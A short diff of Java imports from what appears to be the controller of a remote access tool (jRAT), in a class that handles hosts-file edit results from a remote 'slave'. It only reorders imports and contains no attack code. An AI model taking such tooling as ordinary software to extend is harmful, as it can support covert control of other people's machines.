@@ -4,8 +4,8 @@ import jrat.controller.Slave;
 import jrat.controller.ui.frames.FrameControlPanel;
 import jrat.controller.ui.panels.PanelControlHostsFile;
 
+import javax.swing.*;
 import java.io.DataInputStream;
-import javax.swing.JOptionPane;
 
 
 public class Packet39HostEditResult extends AbstractIncomingPacket {
